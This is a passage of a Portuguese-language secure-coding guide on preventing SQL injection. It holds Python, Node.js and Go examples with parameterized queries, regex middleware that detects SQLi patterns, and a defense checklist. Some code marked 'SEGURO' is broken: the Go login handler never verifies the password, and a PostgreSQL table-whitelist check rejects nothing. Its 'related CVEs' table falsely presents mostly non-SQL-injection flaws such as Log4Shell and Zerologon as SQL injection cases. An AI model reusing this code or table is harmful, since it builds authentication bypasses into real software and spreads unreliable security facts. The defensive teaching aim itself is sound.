    page = request.args.get('page', 1, type=int)
    if page < 1:
        page = 1
    if page > 1000:
        page = 1000
    
    offset = (page - 1) * 20
    
    # SEGURO: sort_by e whitelisted, page e validado
    conn = get_db()
    users = conn.execute(
        f"SELECT id, username, email, created_at FROM users ORDER BY {sort_by} LIMIT 20 OFFSET ?",
        (offset,)
    ).fetchall()
    conn.close()
    
    return jsonify([dict(u) for u in users])

@app.route('/users/by-ids', methods=['POST'])
def get_users_by_ids():
    data = request.get_json()
    ids = data.get('ids', [])
    
    # Validar IDs
    validated_ids = []
    for id_val in ids:
        try:
            id_int = int(id_val)
            if 1 <= id_int <= 1000000:
                validated_ids.append(id_int)
        except (ValueError, TypeError):
            continue
    
    if not validated_ids:
        return jsonify({"error": "No valid IDs provided"}), 400
    
    # SEGURO: parameterized query com IN clause
    placeholders = ','.join(['?' for _ in validated_ids])
    conn = get_db()
    users = conn.execute(
        f"SELECT id, username, email FROM users WHERE id IN ({placeholders})",
        validated_ids
    ).fetchall()
    conn.close()
    
    return jsonify([dict(u) for u in users])

@app.route('/users/raw-query', methods=['POST'])
def raw_query():
    """Endpoint para demonstrar como NAO fazer queries."""
    data = request.get_json()
    table = data.get('table', '')
    
    # Whitelist de tabelas permitidas
    ALLOWED_TABLES = {'users', 'products'}
    if table not in ALLOWED_TABLES:
        return jsonify({"error": "Invalid table name"}), 400
    
    # SEGURO: mesmo com nome de tabela dinamico, usamos whitelist
    conn = get_db()
    results = conn.execute(f"SELECT * FROM {table} LIMIT 10").fetchall()
    conn.close()
    
    return jsonify([dict(r) for r in results])

if __name__ == '__main__':
    init_db()
    app.run(debug=False)
```

### Django Settings e Middleware

```python
# settings.py - Configuracoes de seguranca para Django

# Middleware de seguranca
MIDDLEWARE = [
    'django.middleware.security.SecurityMiddleware',
    'django.contrib.sessions.middleware.SessionMiddleware',
    'django.middleware.common.CommonMiddleware',
    'django.middleware.csrf.CsrfViewMiddleware',
    'django.contrib.auth.middleware.AuthenticationMiddleware',
    'django.contrib.messages.middleware.MessageMiddleware',
    'django.middleware.clickjacking.XFrameOptionsMiddleware',
    # Middleware customizado de validacao SQLi
    'app.middleware.SQLInjectionMiddleware',
]

# Custom middleware para detectar SQLi
# app/middleware.py
import re
from django.http import HttpResponseForbidden

class SQLInjectionMiddleware:
    PATTERNS = [
        r"(?i:union\s+select)",
        r"(?i:or\s+\d+\s*=\s*\d+)",
        r"(?i:--\s)",
        r"(?i:/\*.*\*/)",
        r"(?i:;.*drop\s+table)",
        r"(?i:;.*delete\s+from)",
        r"(?i:;.*insert\s+into)",
    ]
    
    def __init__(self, get_response):
        self.get_response = get_response
    
    def __call__(self, request):
        # Verificar query string
        for pattern in self.PATTERNS:
            if re.search(pattern, request.META.get('QUERY_STRING', '')):
                return HttpResponseForbidden("Potentially malicious request detected")
        
        # Verificar corpo da requisicao
        if request.method in ('POST', 'PUT', 'PATCH'):
            body = request.body.decode('utf-8', errors='ignore')
            for pattern in self.PATTERNS:
                if re.search(pattern, body):
                    return HttpResponseForbidden("Potentially malicious request detected")
        
        response = self.get_response(request)
        return response
```

### SQLAlchemy Session Management

```python
from sqlalchemy import create_engine, text
from sqlalchemy.orm import sessionmaker, Session
from contextlib import contextmanager

engine = create_engine(
    'postgresql://user:pass@localhost/db',
    pool_pre_ping=True,
    pool_size=20,
    max_overflow=30
)

SessionLocal = sessionmaker(bind=engine)

@contextmanager
def get_session():
    session = SessionLocal()
    try:
        yield session
        session.commit()
    except Exception:
        session.rollback()
        raise
    finally:
        session.close()

class UserRepository:
    def __init__(self, session: Session):
        self.session = session
    
    def find_by_username(self, username: str):
        # SEGURO: parameterized query com text()
        result = self.session.execute(
            text("SELECT * FROM users WHERE username = :username"),
            {"username": username}
        )
        return result.mappings().first()
    
    def search(self, query: str, sort_by: str = 'name', page: int = 1):
        # Validar sort_by
        ALLOWED_COLUMNS = {'name', 'email', 'created_at'}
        if sort_by not in ALLOWED_COLUMNS:
            sort_by = 'name'
        
        # Validar page
        page = max(1, min(1000, page))
        offset = (page - 1) * 20
        
        # SEGURO: sort_by whitelisted, demais params parameterized
        sql = text(f"""
            SELECT id, name, email, created_at 
            FROM users 
            WHERE name ILIKE :query 
            ORDER BY {sort_by}
            LIMIT 20 OFFSET :offset
        """)
        
        result = self.session.execute(sql, {
            "query": f"%{query}%",
            "offset": offset
        })
        return result.mappings().all()
    
    def bulk_insert(self, users_data: list):
        # SEGURO: parameterized bulk insert
        sql = text("INSERT INTO users (username, email) VALUES (:username, :email)")
        self.session.execute(sql, users_data)
```

---

## 4.14 Exemplos em Node.js

### Express.js com MySQL

```javascript
const express = require('express');
const mysql = require('mysql2/promise');
const bcrypt = require('bcrypt');

const app = express();
app.use(express.json());

const pool = mysql.createPool({
  host: 'localhost',
  user: 'app_user',
  password: 'secure_password',
  database: 'app_db',
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0
});

// Middleware de validacao SQLi
function sqlInjectionDetector(req, res, next) {
  const patterns = [
    /union\s+select/i,
    /or\s+\d+\s*=\s*\d+/i,
    /--\s/,
    /\/\*.*\*\//,
    /;\s*drop\s+table/i,
    /;\s*delete\s+from/i,
    /;\s*insert\s+into/i,
    /;\s*update\s+\w+\s+set/i,
    /;\s*exec\s*\(/i
  ];
  
  const checkString = (str) => {
    if (!str || typeof str !== 'string') return false;
    return patterns.some(pattern => pattern.test(str));
  };
  
  // Verificar query string
  if (checkString(req.url)) {
    return res.status(403).json({ error: 'Potentially malicious request' });
  }
  
  // Verificar corpo da requisicao
  if (req.body && typeof req.body === 'object') {
    const bodyStr = JSON.stringify(req.body);
    if (checkString(bodyStr)) {
      return res.status(403).json({ error: 'Potentially malicious request' });
    }
  }
  
  next();
}

app.use(sqlInjectionDetector);

// Login SEGURO com parameterized query
app.post('/api/login', async (req, res) => {
  try {
    const { username, password } = req.body;
    
    if (!username || !password) {
      return res.status(400).json({ error: 'Username and password required' });
    }
    
    const [rows] = await pool.execute(
      'SELECT id, username, password_hash, email FROM users WHERE username = ?',
      [username]
    );
    
    if (rows.length === 0) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    const user = rows[0];
    const validPassword = await bcrypt.compare(password, user.password_hash);
    
    if (!validPassword) {
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    res.json({
      success: true,
      user: { id: user.id, username: user.username, email: user.email }
    });
  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Search SEGURO com parameterized query
app.get('/api/products/search', async (req, res) => {
  try {
    const { q, sort, page } = req.query;
    
    if (!q || q.length > 100) {
      return res.status(400).json({ error: 'Invalid search query' });
    }
    
    // Whitelist para sort
    const ALLOWED_SORT = ['name', 'price', 'created_at'];
    const sortColumn = ALLOWED_SORT.includes(sort) ? sort : 'name';
    
    // Validar page
    const pageNum = Math.max(1, Math.min(1000, parseInt(page) || 1));
    const offset = (pageNum - 1) * 20;
    
    // SEGURO: parameterized query
    const [rows] = await pool.execute(
      `SELECT id, name, description, price, category 
       FROM products 
       WHERE name LIKE ? 
       ORDER BY ${sortColumn} 
       LIMIT 20 OFFSET ?`,
      [`%${q}%`, offset]
    );
    
    res.json({ products: rows, page: pageNum });
  } catch (error) {
    console.error('Search error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// User listing com validacao avancada
app.get('/api/users', async (req, res) => {
  try {
    const { sort, order, page, per_page, status } = req.query;
    
    // Validar cada parametro individualmente
    const ALLOWED_SORT = ['username', 'email', 'created_at', 'status'];
    const sortColumn = ALLOWED_SORT.includes(sort) ? sort : 'username';
    
    const ALLOWED_ORDER = ['ASC', 'DESC'];
    const sortOrder = ALLOWED_ORDER.includes(order?.toUpperCase()) ? order.toUpperCase() : 'ASC';
    
    const pageNum = Math.max(1, Math.min(1000, parseInt(page) || 1));
    const perPage = Math.max(1, Math.min(100, parseInt(per_page) || 20));
    const offset = (pageNum - 1) * perPage;
    
    // Parametros adicionais com validacao
    let query = 'SELECT id, username, email, created_at FROM users';
    const params = [];
    
    if (status) {
      const ALLOWED_STATUS = ['active', 'inactive', 'pending'];
      if (ALLOWED_STATUS.includes(status)) {
        query += ' WHERE status = ?';
        params.push(status);
      }
    }
    
    query += ` ORDER BY ${sortColumn} ${sortOrder} LIMIT ? OFFSET ?`;
    params.push(perPage, offset);
    
    const [rows] = await pool.execute(query, params);
    res.json({ users: rows, page: pageNum, per_page: perPage });
  } catch (error) {
    console.error('Users list error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// Registro de usuario com validacao
app.post('/api/register', async (req, res) => {
  try {
    const { username, email, password } = req.body;
    
    // Validacao de username
    if (!username || !/^[a-zA-Z0-9_]{3,50}$/.test(username)) {
      return res.status(400).json({ error: 'Invalid username format' });
    }
    
    // Validacao de email
    if (!email || !/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/.test(email)) {
      return res.status(400).json({ error: 'Invalid email format' });
    }
    
    // Validacao de senha
    if (!password || password.length < 8) {
      return res.status(400).json({ error: 'Password must be at least 8 characters' });
    }
    
    // Verificar se username ja existe
    const [existing] = await pool.execute(
      'SELECT id FROM users WHERE username = ?',
      [username]
    );
    
    if (existing.length > 0) {
      return res.status(409).json({ error: 'Username already exists' });
    }
    
    // Hash da senha
    const passwordHash = await bcrypt.hash(password, 12);
    
    // Inserir usuario
    const [result] = await pool.execute(
      'INSERT INTO users (username, email, password_hash) VALUES (?, ?, ?)',
      [username, email, passwordHash]
    );
    
    res.status(201).json({
      success: true,
      user_id: result.insertId
    });
  } catch (error) {
    console.error('Registration error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.listen(3000, () => console.log('Server running on port 3000'));
```

### Express.js com PostgreSQL

```javascript
const { Pool } = require('pg');

const pool = new Pool({
  host: 'localhost',
  port: 5432,
  database: 'app_db',
  user: 'app_user',
  password: 'secure_password',
  max: 20,
  idleTimeoutMillis: 30000,
  connectionTimeoutMillis: 2000
});

// Middleware de seguranca para PostgreSQL
async function validateAndQuery(queryTemplate, params, allowedTables = []) {
  const client = await pool.connect();
  try {
    // Verificar se a query usa tabelas permitidas
    const queryUpper = queryTemplate.toUpperCase();
    for (const table of allowedTables) {
      if (queryUpper.includes(table.toUpperCase())) {
        break; // Tabela encontrada, prosseguir
      }
    }
    
    // Executar query parameterizada
    const result = await client.query(queryTemplate, params);
    return result.rows;
  } finally {
    client.release();
  }
}

// Exemplo de uso com Express
app.get('/api/products', async (req, res) => {
  try {
    const { search, category, min_price, max_price, sort, order, page } = req.query;
    
    const ALLOWED_SORT = ['name', 'price', 'category', 'created_at'];
    const ALLOWED_ORDER = ['ASC', 'DESC'];
    
    const sortColumn = ALLOWED_SORT.includes(sort) ? sort : 'name';
    const sortOrder = ALLOWED_ORDER.includes(order?.toUpperCase()) ? order.toUpperCase() : 'ASC';
    const pageNum = Math.max(1, Math.min(1000, parseInt(page) || 1));
    const offset = (pageNum - 1) * 20;
    
    let query = 'SELECT id, name, description, price, category FROM products WHERE 1=1';
    const params = [];
    let paramIndex = 1;
    
    if (search) {
      query += ` AND name ILIKE $${paramIndex}`;
      params.push(`%${search}%`);
      paramIndex++;
    }
    
    if (category) {
      const ALLOWED_CATEGORIES = ['electronics', 'books', 'clothing', 'food'];
      if (ALLOWED_CATEGORIES.includes(category)) {
        query += ` AND category = $${paramIndex}`;
        params.push(category);
        paramIndex++;
      }
    }
    
    if (min_price) {
      const minPrice = parseFloat(min_price);
      if (!isNaN(minPrice) && minPrice >= 0) {
        query += ` AND price >= $${paramIndex}`;
        params.push(minPrice);
        paramIndex++;
      }
    }
    
    if (max_price) {
      const maxPrice = parseFloat(max_price);
      if (!isNaN(maxPrice) && maxPrice >= 0) {
        query += ` AND price <= $${paramIndex}`;
        params.push(maxPrice);
        paramIndex++;
      }
    }
    
    query += ` ORDER BY ${sortColumn} ${sortOrder} LIMIT 20 OFFSET $${paramIndex}`;
    params.push(offset);
    
    const result = await pool.query(query, params);
    res.json({ products: result.rows, page: pageNum });
  } catch (error) {
    console.error('Products query error:', error);
    res.status(500).json({ error: 'Internal server error' });
  }
});
```

---

## 4.15 Exemplos em Go

### Go com net/sql e PostgreSQL

```go
package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"log"
	"net/http"
	"regexp"
	"strconv"
	"strings"

	_ "github.com/lib/pq"
)

var db *sql.DB

type User struct {
	ID        int    `json:"id"`
	Username  string `json:"username"`
	Email     string `json:"email"`
	CreatedAt string `json:"created_at"`
}

type Product struct {
	ID          int     `json:"id"`
	Name        string  `json:"name"`
	Description string  `json:"description"`
	Price       float64 `json:"price"`
	Category    string  `json:"category"`
}

func initDB() {
	var err error
	connStr := "host=localhost port=5432 user=app_user password=secure_password dbname=app_db sslmode=disable"
	db, err = sql.Open("postgres", connStr)
	if err != nil {
		log.Fatal(err)
	}
	
	db.SetMaxOpenConns(25)
	db.SetMaxIdleConns(5)
	
	err = db.Ping()
	if err != nil {
		log.Fatal(err)
	}
}

// Middleware de validacao SQLi
func sqlInjectionMiddleware(next http.Handler) http.Handler {
	return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		patterns := []*regexp.Regexp{
			regexp.MustCompile(`(?i)union\s+select`),
			regexp.MustCompile(`(?i)or\s+\d+\s*=\s*\d+`),
			regexp.MustCompile(`--\s`),
			regexp.MustCompile(`/\*.*\*/`),
			regexp.MustCompile(`(?i);\s*drop\s+table`),
			regexp.MustCompile(`(?i);\s*delete\s+from`),
			regexp.MustCompile(`(?i);\s*insert\s+into`),
			regexp.MustCompile(`(?i);\s*exec\s*\(`),
		}
		
		// Verificar URL
		for _, p := range patterns {
			if p.MatchString(r.URL.String()) {
				http.Error(w, "Potentially malicious request", http.StatusForbidden)
				return
			}
		}
		
		next.ServeHTTP(w, r)
	})
}

// Login handler SEGURO
func loginHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	var input struct {
		Username string `json:"username"`
		Password string `json:"password"`
	}
	
	if err := json.NewDecoder(r.Body).Decode(&input); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}
	
	if input.Username == "" || input.Password == "" {
		http.Error(w, "Username and password required", http.StatusBadRequest)
		return
	}
	
	// SEGURO: parameterized query
	var user User
	var passwordHash string
	
	err := db.QueryRow(
		"SELECT id, username, email, created_at FROM users WHERE username = $1",
		input.Username,
	).Scan(&user.ID, &user.Username, &user.Email, &user.CreatedAt)
	
	if err == sql.ErrNoRows {
		http.Error(w, "Invalid credentials", http.StatusUnauthorized)
		return
	}
	if err != nil {
		log.Printf("Login query error: %v", err)
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return
	}
	
	// Verificar senha (simplificado)
	_ = passwordHash
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"success": true,
		"user":    user,
	})
}

// Search handler SEGURO
func searchHandler(w http.ResponseWriter, r *http.Request) {
	query := r.URL.Query()
	searchTerm := query.Get("q")
	sortBy := query.Get("sort")
	order := query.Get("order")
	pageStr := query.Get("page")
	
	// Validar search term
	if searchTerm == "" || len(searchTerm) > 100 {
		http.Error(w, "Invalid search query", http.StatusBadRequest)
		return
	}
	
	// Validar sort
	allowedSort := map[string]bool{
		"name": true, "price": true, "category": true, "created_at": true,
	}
	if !allowedSort[sortBy] {
		sortBy = "name"
	}
	
	// Validar order
	allowedOrder := map[string]bool{"ASC": true, "DESC": true}
	orderUpper := strings.ToUpper(order)
	if !allowedOrder[orderUpper] {
		orderUpper = "ASC"
	}
	
	// Validar page
	page, err := strconv.Atoi(pageStr)
	if err != nil || page < 1 {
		page = 1
	}
	if page > 1000 {
		page = 1000
	}
	offset := (page - 1) * 20
	
	// SEGURO: parameterized query
	rows, err := db.Query(
		fmt.Sprintf(
			"SELECT id, name, description, price, category FROM products WHERE name ILIKE $1 ORDER BY %s %s LIMIT 20 OFFSET $2",
			sortBy, orderUpper,
		),
		"%"+searchTerm+"%",
		offset,
	)
	if err != nil {
		log.Printf("Search query error: %v", err)
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return
	}
	defer rows.Close()
	
	products := make([]Product, 0)
	for rows.Next() {
		var p Product
		if err := rows.Scan(&p.ID, &p.Name, &p.Description, &p.Price, &p.Category); err != nil {
			log.Printf("Scan error: %v", err)
			continue
		}
		products = append(products, p)
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"products": products,
		"page":     page,
	})
}

// Users list handler com validacao
func usersHandler(w http.ResponseWriter, r *http.Request) {
	query := r.URL.Query()
	sortBy := query.Get("sort")
	status := query.Get("status")
	pageStr := query.Get("page")
	
	// Validar sort
	allowedSort := map[string]bool{
		"username": true, "email": true, "created_at": true, "status": true,
	}
	if !allowedSort[sortBy] {
		sortBy = "username"
	}
	
	// Validar status
	allowedStatus := map[string]bool{
		"active": true, "inactive": true, "pending": true,
	}
	
	// Validar page
	page, err := strconv.Atoi(pageStr)
	if err != nil || page < 1 {
		page = 1
	}
	offset := (page - 1) * 20
	
	// Construir query dinamicamente
	baseQuery := "SELECT id, username, email, created_at FROM users"
	var args []interface{}
	argIndex := 1
	
	if allowedStatus[status] {
		baseQuery += fmt.Sprintf(" WHERE status = $%d", argIndex)
		args = append(args, status)
		argIndex++
	}
	
	baseQuery += fmt.Sprintf(" ORDER BY %s LIMIT 20 OFFSET $%d", sortBy, argIndex)
	args = append(args, offset)
	
	rows, err := db.Query(baseQuery, args...)
	if err != nil {
		log.Printf("Users query error: %v", err)
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return
	}
	defer rows.Close()
	
	users := make([]User, 0)
	for rows.Next() {
		var u User
		if err := rows.Scan(&u.ID, &u.Username, &u.Email, &u.CreatedAt); err != nil {
			log.Printf("Scan error: %v", err)
			continue
		}
		users = append(users, u)
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"users": users,
		"page":  page,
	})
}

// Bulk operations handler com validacao
func bulkHandler(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		http.Error(w, "Method not allowed", http.StatusMethodNotAllowed)
		return
	}
	
	var input struct {
		IDs []int `json:"ids"`
	}
	
	if err := json.NewDecoder(r.Body).Decode(&input); err != nil {
		http.Error(w, "Invalid request body", http.StatusBadRequest)
		return
	}
	
	// Validar IDs
	validIDs := make([]int, 0)
	for _, id := range input.IDs {
		if id > 0 && id < 1000000 {
			validIDs = append(validIDs, id)
		}
	}
	
	if len(validIDs) == 0 {
		http.Error(w, "No valid IDs provided", http.StatusBadRequest)
		return
	}
	
	// SEGURO: parameterized query com IN clause
	placeholders := make([]string, len(validIDs))
	args := make([]interface{}, len(validIDs))
	for i, id := range validIDs {
		placeholders[i] = fmt.Sprintf("$%d", i+1)
		args[i] = id
	}
	
	query := fmt.Sprintf(
		"SELECT id, username, email, created_at FROM users WHERE id IN (%s)",
		strings.Join(placeholders, ","),
	)
	
	rows, err := db.Query(query, args...)
	if err != nil {
		log.Printf("Bulk query error: %v", err)
		http.Error(w, "Internal server error", http.StatusInternalServerError)
		return
	}
	defer rows.Close()
	
	users := make([]User, 0)
	for rows.Next() {
		var u User
		if err := rows.Scan(&u.ID, &u.Username, &u.Email, &u.CreatedAt); err != nil {
			log.Printf("Scan error: %v", err)
			continue
		}
		users = append(users, u)
	}
	
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"users": users,
		"count": len(users),
	})
}

func main() {
	initDB()
	defer db.Close()
	
	mux := http.NewServeMux()
	mux.HandleFunc("/login", loginHandler)
	mux.HandleFunc("/products/search", searchHandler)
	mux.HandleFunc("/users", usersHandler)
	mux.HandleFunc("/bulk", bulkHandler)
	
	// Aplicar middleware
	handler := sqlInjectionMiddleware(mux)
	
	log.Println("Server starting on :8080")
	log.Fatal(http.ListenAndServe(":8080", handler))
}
```

---

## 4.16 Resumo e Checklist de Defesa

### Camadas de Defesa

A defesa contra SQL injection deve ser implementada em multiplos niveis (defense-in-depth):

**Nivel 1 — Codigo:**
- Usar parameterized queries/prepared statements em TODAS as queries
- Nunca concatenar input do usuario diretamente em queries SQL
- Usar ORMs corretamente (evitar raw queries quando possivel)
- Validar e sanitizar todas as entradas do usuario
- Usar whitelist para nomes de tabelas e colunas dinamicas

**Nivel 2 — Aplicacao:**
- Implementar middleware de deteccao de SQLi
- Configurar error handling para nao expor detalhes do banco de dados
- Implementar rate limiting para prevenir automatizacao
- Usar Content Security Policy e headers de seguranca

**Nivel 3 — Infraestrutura:**
- Configurar WAF com regras especificas para SQLi
- Usar o principio de minimo privilegio (least privilege) para contas de banco de dados da aplicacao
- Implementar segmentacao de rede
- Monitorar logs do banco de dados para atividade suspeita

**Nivel 4 — Processos:**
- Realizar code review especifico para SQLi
- Incluir testes de seguranca (DAST, SAST) no pipeline de CI/CD
- Manter bibliotecas e frameworks atualizados
- Treinar regularmente a equipe em seguranca de aplicações web

### Checklist de Seguranca

```
[ ] Todas as queries SQL usam parameterized queries/prepared statements
[ ] Nenhum input do usuario e concatenado diretamente em queries SQL
[ ] ORMs sao usados corretamente (sem raw queries desnecessarios)
[ ] Nomes de tabelas e colunas dinamicos usam whitelist
[ ] Input validation e implementada em todos os endpoints
[ ] Error handling nao expoe detalhes do banco de dados
[ ] WAF esta configurado com regras anti-SQLi
[ ] Contas de banco de dados da aplicacao tem minimo privilegio
[ ] Testes de seguranca (DAST/SAST) sao executados regularmente
[ ] Bibliotecas e frameworks estao atualizados
[ ] Code review inclui verificacao de SQLi
[ ] Logs de banco de dados sao monitorados
[ ] Segmentacao de rede esta implementada
[ ] Credenciais de banco de dados nao estao no codigo-fonte
[ ] Mecanismo de backup e recovery esta testado
```

### Recursos Adicionais

- OWASP SQL Injection Prevention Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html
- OWASP Testing Guide for SQL Injection: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection
- SQL Injection Knowledge Base: https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
- CWE-89: SQL Injection: https://cwe.mitre.org/data/definitions/89.html

### CVEs Relacionadas

| CVE | Aplicacao | Ano | Severidade |
|-----|-----------|-----|------------|
| CVE-2017-5638 | Apache Struts 2 | 2017 | 10.0 (Critical) |
| CVE-2019-11510 | Pulse Secure VPN | 2019 | 10.0 (Critical) |
| CVE-2021-44228 | Log4Shell (indireto) | 2021 | 10.0 (Critical) |
| CVE-2023-22515 | Atlassian Confluence | 2023 | 10.0 (Critical) |
| CVE-2022-22963 | Spring Cloud Function | 2022 | 9.8 (Critical) |
| CVE-2021-21972 | VMware vCenter | 2021 | 9.8 (Critical) |
| CVE-2018-7600 | Drupal | 2018 | 9.8 (Critical) |
| CVE-2020-1472 | Zerologon | 2020 | 10.0 (Critical) |
| CVE-2019-0192 | Apache Solr | 2019 | 9.8 (Critical) |
| CVE-2015-1635 | IIS HTTP.sys | 2015 | 10.0 (Critical) |
